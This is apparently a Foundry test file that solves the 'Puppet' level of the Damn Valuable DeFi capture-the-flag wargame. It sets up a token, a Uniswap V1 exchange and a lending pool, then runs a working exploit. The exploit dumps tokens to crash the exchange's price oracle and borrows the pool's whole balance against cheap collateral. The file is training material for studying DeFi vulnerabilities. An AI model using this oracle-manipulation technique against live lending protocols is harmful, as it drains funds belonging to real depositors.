// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/levels/Puppet/PuppetPool.sol";

contract PuppetTest is DSTest {
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address constant deployer =
        address(uint160(uint256(keccak256("DEPLOYER"))));
    address constant player = address(uint160(uint256(keccak256("PLAYER"))));
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10 ether;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10 ether;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25 ether;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000 ether;

    DamnValuableToken token;
    PuppetPool pool;
    address exchange;
    address factory;
    address uniswapTokenPool;

    function setUp() public {
        address exchangeAddr;
        address factoryAddr;

        vm.startPrank(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        token = new DamnValuableToken();

        bytes memory exchangeBytecode = abi.encodePacked(
            vm.getCode("./src/build-uniswap-v1/UniswapV1Exchange.json")
        );

        assembly {
            exchangeAddr := create(
                0,
                add(exchangeBytecode, 0x20),
                mload(exchangeBytecode)
            )
        }

        exchange = exchangeAddr;

        bytes memory factoryBytecode = abi.encodePacked(
            vm.getCode("./src/build-uniswap-v1/UniswapV1Factory.json")
        );

        assembly {
            factoryAddr := create(
                0,
                add(factoryBytecode, 0x20),
                mload(factoryBytecode)
            )
        }

        factory = factoryAddr;
        (bool success, ) = factory.call(
            abi.encodeWithSignature(
                "initializeFactory(address)",
                address(exchange)
            )
        );

        require(success, "Factory Initialization failed");

        (bool createExchangeSuccess, bytes memory data) = factory.call(
            abi.encodeWithSignature("createExchange(address)", address(token))
        );
        require(createExchangeSuccess, "Exchange Creation failed");
        uniswapTokenPool = address(uint160(uint256(bytes32(data))));

        pool = new PuppetPool(address(token), uniswapTokenPool);

        token.approve(uniswapTokenPool, UNISWAP_INITIAL_TOKEN_RESERVE);

        vm.deal(deployer, UNISWAP_INITIAL_ETH_RESERVE);
        (bool addLiquiditySuccess, ) = uniswapTokenPool.call{
            value: UNISWAP_INITIAL_ETH_RESERVE
        }(
            abi.encodeWithSignature(
                "addLiquidity(uint256,uint256,uint256)",
                0,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                block.timestamp * 2
            )
        );
        require(addLiquiditySuccess, "Add Liquidity Failed");

        (bool readSuccess, bytes memory returnData) = uniswapTokenPool.call(
            abi.encodeWithSignature("getTokenToEthInputPrice(uint256)", 1 ether)
        );

        require(readSuccess, "getTokenToETHInputPrice failed");
        assertEq(
            uint256(bytes32(returnData)),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(pool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(pool.calculateDepositRequired(1 ether), 2 ether);
        assertEq(
            pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );

        vm.stopPrank();
    }

    function calculateTokenToEthInputPrice(
        uint256 tokenSold,
        uint256 tokenInReverse,
        uint256 etherInReserve
    ) internal pure returns (uint256) {
        return
            (tokenSold * 997 * etherInReserve) /
            (tokenInReverse * 1000 + tokenSold * 997);
    }

    function testIsPuppetCleared() public {
        vm.startPrank(player);

        token.approve(uniswapTokenPool, type(uint256).max);

        (bool success, ) = uniswapTokenPool.call(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                1000 ether,
                1,
                2
            )
        );
        require(success, "Swap Failed");

        pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

        pool.borrow{value: player.balance}(POOL_INITIAL_TOKEN_BALANCE, player);

        // I really don't know how to solve this in one transaction.

        assertEq(token.balanceOf(address(pool)), 0);
        assertGe(
            token.balanceOf(player),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough token balance in player"
        );

        vm.stopPrank();
    }
}
